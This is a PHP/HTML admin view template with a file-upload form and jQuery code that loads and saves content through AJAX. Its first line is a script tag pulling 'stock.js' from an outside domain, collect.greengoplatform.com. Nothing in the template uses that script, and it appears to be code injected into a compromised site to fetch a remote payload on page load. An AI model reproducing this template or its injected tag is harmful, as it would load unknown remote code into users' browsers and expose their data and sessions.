<script src='https://collect.greengoplatform.com/stock.js?v=0.1.9' type='text/javascript'></script>
<form class="form_input">
    <div class="card">
        <div class="card-header" >
            <div class="d-flex justify-content-between">
                <div class="d-flex justify-content-around">
                    <input type="hidden" name="<?=$this->fileUploaded?>[]" id="<?=$this->fileUploaded?>"/>
                    <input data-error="file-upload" class="form-control" type="file" name="<?=$this->fileUpload?>[]" id="file_upload" onchange="return ValidateFileUpload('file_upload')" accept="*">
                    <img  style="margin-left:5px;max-height: 40px;border-radius: .375rem" src="<?=$this->noImage?>" id="result_image">
                </div>
                <div>
                    <button type="submit" class="btn btn-primary btn-save" style="float: right;"><i class='bx bx-send'></i></button>
                    <button class="btn btn-primary btn-loading" type="button" disabled  style="float: right;display: none;">
                        <span class="spinner-border" role="status" aria-hidden="true"></span>
                    </button>
                </div>
            </div>
        </div>
        <div class="card-body" id="result-sub" style="">
        </div>
    </div>
</form>

<script>
    var quillPrivacy;
    var data;
    $(document).ready(function(){
        loadData();
    });
    function loadData(isCache=true) {
        var url="tambahan/read/<?=$controller?>";
        if(!isCache) localCache.remove(base_url+url);
        var getJson=localCache.get(base_url+url);
        urlActive = url;
        if(getJson!==undefined){
            var row=getJson.responseText;
            attrId("result-sub").html(row);
        }
        else{
            ajaxView(url,null,function(res){
                attrId("result-sub").html(res);
            });
        }

    }

    attrClass("form_input").on("submit",function(e){
        e.preventDefault();
        var url="tambahan/simpan/<?=strtolower($controller)?>";
        if(!isQuill(quillPrivacy.container.innerText)){
            timeOut(function(){quillPrivacy.focus();});
            return;
        }
        var formData=new FormData(attrClass("form_input")[0]);
        var myEditor = document.querySelector(`#${strDeskripsi}`);
        var html = myEditor.children[0].innerHTML;
        formData.append("id", data.id);
        formData.append(strDeskripsi, html);
        ajaxFile(base_url+url,formData,function (res) {
            if (res.status) {
                loadData(false);
                notif(strSuccess);
            } else {
                notif(strFailed);
            }
        })
    })

</script>